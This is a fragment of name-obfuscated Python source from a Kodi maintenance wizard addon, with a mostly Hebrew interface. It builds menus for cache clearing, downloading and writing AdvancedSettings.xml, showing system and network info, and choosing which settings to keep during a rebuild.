		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OOOOOO0O000OOO00O .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2894
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2895
	addFile ('Include Video Cache in Clear Cache: %s'%O000O00000O000O00 .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2896
	if O000O00000O000O00 =='true':#line:2897
		addFile ('--- Include All Video Addons: %s'%O00O0O0O0OO0O000O .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2898
		addFile ('--- Include Bob: %s'%O0OO000000OO0OO00 .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2899
		addFile ('--- Include Phoenix: %s'%O00OO00OO0000O000 .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2900
		addFile ('--- Include Specto: %s'%O00OOOOOOOO000O0O .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2901
		addFile ('--- Include Exodus: %s'%OOOOOOO00O000OO00 .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2902
		addFile ('--- Include Salts: %s'%OOO0000OOO0OO0000 .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2903
		addFile ('--- Include Salts HD Lite: %s'%O0OOO0O0OO000OO0O .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2904
		addFile ('--- Include One Channel: %s'%OOOOO00OOO0OO0O00 .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2905
		addFile ('--- Include Genesis: %s'%O0OO000OO00OO00O0 .replace ('true',OOOOOO00O00O0OO00 ).replace ('false',O0O0OO00O0OOOO00O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2906
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2907
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2908
	setView ('files','viewType')#line:2909
def advancedWindow (url =None ):#line:2911
	if not ADVANCEDFILE =='http://':#line:2912
		if url ==None :#line:2913
			O0OO0O0O000OOO0O0 =wiz .workingURL (ADVANCEDFILE )#line:2914
			O00OOO000O000O000 =uservar .ADVANCEDFILE #line:2915
		else :#line:2916
			O0OO0O0O000OOO0O0 =wiz .workingURL (url )#line:2917
			O00OOO000O000O000 =url #line:2918
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2919
		if os .path .exists (ADVANCED ):#line:2920
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2921
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2922
		if O0OO0O0O000OOO0O0 ==True :#line:2923
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2924
			O0O0OOOOOO0O0OO0O =wiz .openURL (O00OOO000O000O000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2925
			O0OO00000O0OOOOO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0OOOOOO0O0OO0O )#line:2926
			if len (O0OO00000O0OOOOO0 )>0 :#line:2927
				for OO0OOOOO00OOOOO00 ,O00O000000OO0OOOO ,url ,OO0O0O0OO00OOOOO0 ,OO00000O0OO0O0O00 ,O0O0O0O0OO000O0O0 in O0OO00000O0OOOOO0 :#line:2928
					if O00O000000OO0OOOO .lower ()=="yes":#line:2929
						addDir ("[B]%s[/B]"%OO0OOOOO00OOOOO00 ,'advancedsetting',url ,description =O0O0O0O0OO000O0O0 ,icon =OO0O0O0OO00OOOOO0 ,fanart =OO00000O0OO0O0O00 ,themeit =THEME3 )#line:2930
					else :#line:2931
						addFile (OO0OOOOO00OOOOO00 ,'writeadvanced',OO0OOOOO00OOOOO00 ,url ,description =O0O0O0O0OO000O0O0 ,icon =OO0O0O0OO00OOOOO0 ,fanart =OO00000O0OO0O0O00 ,themeit =THEME2 )#line:2932
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2933
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OO0O0O000OOO0O0 )#line:2934
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2935
def writeAdvanced (OOOO0OO00000OO0OO ,O000OOO0O00O0O000 ):#line:2937
	OOOO0OOO0O000OO00 =wiz .workingURL (O000OOO0O00O0O000 )#line:2938
	if OOOO0OOO0O000OO00 ==True :#line:2939
		if os .path .exists (ADVANCED ):OOO0OOOOOO000OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO0OO00000OO0OO ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2940
		else :OOO0OOOOOO000OOO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OOOO0OO00000OO0OO ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2941
		if OOO0OOOOOO000OOO0 ==1 :#line:2943
			O0OO00OOO00O00000 =wiz .openURL (O000OOO0O00O0O000 )#line:2944
			O0O0O00O000O0O0O0 =open (ADVANCED ,'w');#line:2945
			O0O0O00O000O0O0O0 .write (O0OO00OOO00O00000 )#line:2946
			O0O0O00O000O0O0O0 .close ()#line:2947
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2948
			wiz .killxbmc (True )#line:2949
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2950
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOO0OOO0O000OO00 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2951
def viewAdvanced ():#line:2953
	O000O000OO0OOOO0O =open (ADVANCED )#line:2954
	OOO0OOOOOOO0OOOOO =O000O000OO0OOOO0O .read ().replace ('\t','    ')#line:2955
	wiz .TextBox (ADDONTITLE ,OOO0OOOOOOO0OOOOO )#line:2956
	O000O000OO0OOOO0O .close ()#line:2957
def removeAdvanced ():#line:2959
	if os .path .exists (ADVANCED ):#line:2960
		wiz .removeFile (ADVANCED )#line:2961
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2962
def showAutoAdvanced ():#line:2964
	notify .autoConfig ()#line:2965
def getIP ():#line:2967
	OO00OO000O00O00O0 ='http://whatismyipaddress.com/'#line:2968
	if not wiz .workingURL (OO00OO000O00O00O0 ):return 'Unknown','Unknown','Unknown'#line:2969
	OO0O0OOO00O0O0O00 =wiz .openURL (OO00OO000O00O00O0 ).replace ('\n','').replace ('\r','')#line:2970
	if not 'Access Denied'in OO0O0OOO00O0O0O00 :#line:2971
		OOOOOO000000OO000 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OO0O0OOO00O0O0O00 )#line:2972
		OOO00OO00O0OO0000 =OOOOOO000000OO000 [0 ]if (len (OOOOOO000000OO000 )>0 )else 'Unknown'#line:2973
		O00O0OOO00OO0O0OO =re .compile ('"font-size:14px;">(.+?)</td>').findall (OO0O0OOO00O0O0O00 )#line:2974
		O0O0000O00O00O0O0 =O00O0OOO00OO0O0OO [0 ]if (len (O00O0OOO00OO0O0OO )>0 )else 'Unknown'#line:2975
		O0OO0O0OO00O00O00 =O00O0OOO00OO0O0OO [1 ]+', '+O00O0OOO00OO0O0OO [2 ]+', '+O00O0OOO00OO0O0OO [3 ]if (len (O00O0OOO00OO0O0OO )>2 )else 'Unknown'#line:2976
		return OOO00OO00O0OO0000 ,O0O0000O00O00O0O0 ,O0OO0O0OO00O00O00 #line:2977
	else :return 'Unknown','Unknown','Unknown'#line:2978
def systemInfo ():#line:2980
	O00OOO000OOO0OOO0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2994
	OOO0O0O00O000O0O0 =[];O0O00O00OO00O00OO =0 #line:2995
	for OOO0O0O0OO0OOO0OO in O00OOO000OOO0OOO0 :#line:2996
		O00O0OOO0OO0OOO00 =wiz .getInfo (OOO0O0O0OO0OOO0OO )#line:2997
		O0000OO00OO0O0OO0 =0 #line:2998
		while O00O0OOO0OO0OOO00 =="Busy"and O0000OO00OO0O0OO0 <10 :#line:2999
			O00O0OOO0OO0OOO00 =wiz .getInfo (OOO0O0O0OO0OOO0OO );O0000OO00OO0O0OO0 +=1 ;wiz .log ("%s sleep %s"%(OOO0O0O0OO0OOO0OO ,str (O0000OO00OO0O0OO0 )));xbmc .sleep (1000 )#line:3000
		OOO0O0O00O000O0O0 .append (O00O0OOO0OO0OOO00 )#line:3001
		O0O00O00OO00O00OO +=1 #line:3002
	O0O0OOOOOO0O000O0 =OOO0O0O00O000O0O0 [8 ]if 'Una'in OOO0O0O00O000O0O0 [8 ]else wiz .convertSize (int (float (OOO0O0O00O000O0O0 [8 ][:-8 ]))*1024 *1024 )#line:3003
	OO00OOO0O0OO0000O =OOO0O0O00O000O0O0 [9 ]if 'Una'in OOO0O0O00O000O0O0 [9 ]else wiz .convertSize (int (float (OOO0O0O00O000O0O0 [9 ][:-8 ]))*1024 *1024 )#line:3004
	OOOO0O0OO00O000O0 =OOO0O0O00O000O0O0 [10 ]if 'Una'in OOO0O0O00O000O0O0 [10 ]else wiz .convertSize (int (float (OOO0O0O00O000O0O0 [10 ][:-8 ]))*1024 *1024 )#line:3005
	O000OOO000OO0OOO0 =wiz .convertSize (int (float (OOO0O0O00O000O0O0 [11 ][:-2 ]))*1024 *1024 )#line:3006
	OOO0OO0O0O0OO00OO =wiz .convertSize (int (float (OOO0O0O00O000O0O0 [12 ][:-2 ]))*1024 *1024 )#line:3007
	O000O00OO000OOO0O =wiz .convertSize (int (float (OOO0O0O00O000O0O0 [13 ][:-2 ]))*1024 *1024 )#line:3008
	O0O0O0OO0O0OOO00O ,OOO0O00O0O0OO0O0O ,O0O0O0O0O0O0O0OOO =getIP ()#line:3009
	O0OOOO0O0OOOOO0O0 =[];O0O0OOO0O0O00000O =[];OO0000OOO00O00OO0 =[];O0O00O0OO0OO00O0O =[];O0000O00O00000OO0 =[];OO00O00O0O00OO0OO =[];OOOOOO0O0O0OOO000 =[]#line:3011
	OO0O00O0000000O0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3013
	for O00OO0OO0O000OOOO in sorted (OO0O00O0000000O0O ,key =lambda O00O0OO00OOOO0O00 :O00O0OO00OOOO0O00 ):#line:3014
		OO000OO00OO00O0OO =os .path .split (O00OO0OO0O000OOOO [:-1 ])[1 ]#line:3015
		if OO000OO00OO00O0OO =='packages':continue #line:3016
		OOO0O0O00O00OOO00 =os .path .join (O00OO0OO0O000OOOO ,'addon.xml')#line:3017
		if os .path .exists (OOO0O0O00O00OOO00 ):#line:3018
			O000OOO0OO000O000 =open (OOO0O0O00O00OOO00 )#line:3019
			OO0O00OOOOOO000O0 =O000OOO0OO000O000 .read ()#line:3020
			O00OO00OO0O0OOOOO =re .compile ("<provides>(.+?)</provides>").findall (OO0O00OOOOOO000O0 )#line:3021
			if len (O00OO00OO0O0OOOOO )==0 :#line:3022
				if OO000OO00OO00O0OO .startswith ('skin'):OOOOOO0O0O0OOO000 .append (OO000OO00OO00O0OO )#line:3023
				if OO000OO00OO00O0OO .startswith ('repo'):O0000O00O00000OO0 .append (OO000OO00OO00O0OO )#line:3024
				else :OO00O00O0O00OO0OO .append (OO000OO00OO00O0OO )#line:3025
			elif not (O00OO00OO0O0OOOOO [0 ]).find ('executable')==-1 :O0O00O0OO0OO00O0O .append (OO000OO00OO00O0OO )#line:3026
			elif not (O00OO00OO0O0OOOOO [0 ]).find ('video')==-1 :OO0000OOO00O00OO0 .append (OO000OO00OO00O0OO )#line:3027
			elif not (O00OO00OO0O0OOOOO [0 ]).find ('audio')==-1 :O0O0OOO0O0O00000O .append (OO000OO00OO00O0OO )#line:3028
			elif not (O00OO00OO0O0OOOOO [0 ]).find ('image')==-1 :O0OOOO0O0OOOOO0O0 .append (OO000OO00OO00O0OO )#line:3029
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3031
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00O000O0O0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3032
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00O000O0O0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3033
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3034
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00O000O0O0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3035
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00O000O0O0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3036
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3038
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00O000O0O0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3039
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00O000O0O0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3040
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3042
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0OOOOOO0O000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3043
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00OOO0O0OO0000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3044
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0O0OO00O000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3045
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3047
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000OOO000OO0OOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3048
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0OO0O0O0OO00OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3049
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O000O00OO000OOO0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3050
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3052
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00O000O0O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3053
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0OO0O0OOO00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3054
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O00O0O0OO0O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3055
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0O0O0O0O0O0OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3056
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO0O0O00O000O0O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3057
	OOOO0000000OOOOO0 =len (O0OOOO0O0OOOOO0O0 )+len (O0O0OOO0O0O00000O )+len (OO0000OOO00O00OO0 )+len (O0O00O0OO0OO00O0O )+len (OO00O00O0O00OO0OO )+len (OOOOOO0O0O0OOO000 )+len (O0000O00O00000OO0 )#line:3059
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,OOOO0000000OOOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3060
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0000OOO00O00OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3061
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O00O0OO0OO00O0O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3062
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OOO0O0O00000O ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3063
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0OOOO0O0OOOOO0O0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3064
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0000O00O00000OO0 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3065
	addFile ('[COLOR %s]Skins:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOOOOO0O0O0OOO000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3066
	addFile ('[COLOR %s]Scripts/Modules:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00O00O0O00OO0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3067
def Menu ():#line:3068
	addDir ('אפשרויות נוספות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:3069
def saveMenu ():#line:3071
	OOOOO0O0OOOO00O0O ='[COLOR yellow]מופעל[/COLOR]';O000O0OOOOO000O0O ='[COLOR blue]מבוטל[/COLOR]'#line:3073
	O000O00OOO0OOO000 ='true'if KEEPMOVIEWALL =='true'else 'false'#line:3074
	OOO00O0O0OO0O0O0O ='true'if KEEPMOVIELIST =='true'else 'false'#line:3075
	O00000OOO0O0O0O00 ='true'if KEEPINFO =='true'else 'false'#line:3076
	OO00000O00OOOO0O0 ='true'if KEEPSOUND =='true'else 'false'#line:3078
	O00OO0O0OO0000O0O ='true'if KEEPVIEW =='true'else 'false'#line:3079
	OO000O0O00O0OOOOO ='true'if KEEPSKIN =='true'else 'false'#line:3080
	OOOOOOO00O0OOO00O ='true'if KEEPSKIN2 =='true'else 'false'#line:3081
	O0000O0000O00O00O ='true'if KEEPSKIN3 =='true'else 'false'#line:3082
	O00O00O0O000O0OO0 ='true'if KEEPADDONS =='true'else 'false'#line:3083
	OO00O0O0O0000OO0O ='true'if KEEPPVR =='true'else 'false'#line:3084
	OO0O000O00OOO0OO0 ='true'if KEEPTVLIST =='true'else 'false'#line:3085
	OO00OOOOO00OOO0OO ='true'if KEEPHUBMOVIE =='true'else 'false'#line:3086
	O000O0O0O0O0O0O00 ='true'if KEEPHUBTVSHOW =='true'else 'false'#line:3087
	O0O00O0O0OOOO00O0 ='true'if KEEPHUBTV =='true'else 'false'#line:3088
	O000OO00OO000OOO0 ='true'if KEEPHUBVOD =='true'else 'false'#line:3089
	O0O0OO00OO0O0O00O ='true'if KEEPHUBSPORT =='true'else 'false'#line:3090
	OO0OO000OO000O00O ='true'if KEEPHUBKIDS =='true'else 'false'#line:3091
	O00OOOOOOOO0O0OOO ='true'if KEEPHUBMUSIC =='true'else 'false'#line:3092
	OOOOOOOO000000O0O ='true'if KEEPHUBMENU =='true'else 'false'#line:3093
	O0OO0O000O00O0000 ='true'if KEEPPLAYLIST =='true'else 'false'#line:3094
	OO00O000OOO00OOO0 ='true'if KEEPTRAKT =='true'else 'false'#line:3095
	OOO0O0O0O0OO00O00 ='true'if KEEPREAL =='true'else 'false'#line:3096
	O0OO00OOOO00OO0O0 ='true'if KEEPRD2 =='true'else 'false'#line:3097
	O00OOOOOOO00OOOOO ='true'if KEEPTORNET =='true'else 'true'#line:3098
	OOO0OO00O0O0O000O ='true'if KEEPLOGIN =='true'else 'false'#line:3099
	OOOOO00O0OO0O000O ='true'if KEEPSOURCES =='true'else 'false'#line:3100
	O00000000O0O00O0O ='true'if KEEPADVANCED =='true'else 'false'#line:3101
	O000OO0OO0OO00OO0 ='true'if KEEPPROFILES =='true'else 'false'#line:3102
	OO0O00O0O0O00OO00 ='true'if KEEPFAVS =='true'else 'false'#line:3103
	O00O0O0O0OO0OOOOO ='true'if KEEPREPOS =='true'else 'false'#line:3104
	OO0OOOOOOO00O00OO ='true'if KEEPSUPER =='true'else 'false'#line:3105
	O00O0O0O00OOOOOOO ='true'if KEEPWHITELIST =='true'else 'false'#line:3106
	OO0O0OOO00000OO0O ='true'if KEEPWEATHER =='true'else 'false'#line:3107
	if O00O0O0O00OOOOOOO =='true':#line:3111
		addFile ('בחר הרחבות לשמירה','whitelist','edit',icon =ICONSAVE ,themeit =THEME1 )#line:3112
		addFile ('רשימת ההרחבות שבחרתי לשמור','whitelist','view',icon =ICONSAVE ,themeit =THEME1 )#line:3113
		addFile ('נקה רשימת הרחבות','whitelist','clear',icon =ICONSAVE ,themeit =THEME1 )#line:3114
		addFile ('יבה רשימת הרחבות','whitelist','import',icon =ICONSAVE ,themeit =THEME1 )#line:3115
		addFile ('יצא רשימת הרחבות','whitelist','export',icon =ICONSAVE ,themeit =THEME1 )#line:3116
	addFile ('%s התקנת קיר סרטים: '%O000O00OOO0OOO000 .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepmoviewall',icon =ICONTRAKT ,themeit =THEME1 )#line:3118
	addFile ('%s שמירת חשבון RD:  '%OOO0O0O0O0OO00O00 .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME1 )#line:3119
	addFile ('%s שמירת חשבון טראקט:  '%OO00O000OOO00OOO0 .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME1 )#line:3120
	addFile ('%s שמירת מועדפים:  '%OO0O00O0O0O00OO00 .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepfavourites',icon =ICONSAVE ,themeit =THEME1 )#line:3123
	addFile ('%s שמירת לקוח טלוויזיה:  '%OO00O0O0O0000OO0O .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keeppvr',icon =ICONTRAKT ,themeit =THEME1 )#line:3124
	addFile ('%s שמירת רשימת עורצי טלוויזיה:  '%OO0O000O00OOO0OO0 .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keeptvlist',icon =ICONTRAKT ,themeit =THEME1 )#line:3125
	addFile ('%s שמירת אריח סרטים:  '%OO00OOOOO00OOO0OO .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keephubmovie',icon =ICONTRAKT ,themeit =THEME1 )#line:3126
	addFile ('%s שמירת אריח סדרות:  '%O000O0O0O0O0O0O00 .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keephubtvshow',icon =ICONTRAKT ,themeit =THEME1 )#line:3127
	addFile ('%s שמירת אריח טלויזיה:  '%O0O00O0O0OOOO00O0 .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keephubtv',icon =ICONTRAKT ,themeit =THEME1 )#line:3128
	addFile ('%s שמירת אריח תוכן ישראלי:  '%O000OO00OO000OOO0 .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3129
	addFile ('%s שמירת אריח ספורט:  '%O0O0OO00OO0O0O00O .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keephubvod',icon =ICONTRAKT ,themeit =THEME1 )#line:3130
	addFile ('%s שמירת אריח ילדים:  '%OO0OO000OO000O00O .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keephubkids',icon =ICONTRAKT ,themeit =THEME1 )#line:3131
	addFile ('%s שמירת אריח מוסיקה:  '%O00OOOOOOOO0O0OOO .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keephubmusic',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת תפריט אריחים ראשי:  '%OOOOOOOO000000O0O .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keephubmenu',icon =ICONTRAKT ,themeit =THEME1 )#line:3133
	addFile ('%s שמירת כל האריחים בסקין:  '%OO000O0O00O0OOOOO .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepskin',icon =ICONTRAKT ,themeit =THEME1 )#line:3134
	addFile ('%s שמירת הגדרות מזג האוויר:  '%OO0O0OOO00000OO0O .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepweather',icon =ICONTRAKT ,themeit =THEME1 )#line:3135
	addFile ('%s שמירת הרחבות שהתקנתי:  '%O00O00O0O000O0OO0 .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepaddons',icon =ICONTRAKT ,themeit =THEME1 )#line:3141
	addFile ('%s שמירת סיסמאות, חשבונות ,מיקומי הורדות:  '%O00000OOO0O0O0O00 .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3142
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OOO00O0O0OO0O0O0O .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3145
	addFile ('%s שמירת מקורות וידאו:  '%OOOOO00O0OO0O000O .replace ('true',OOOOO0O0OOOO00O0O ).replace ('false',O000O0OOOOO000O0O ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3146
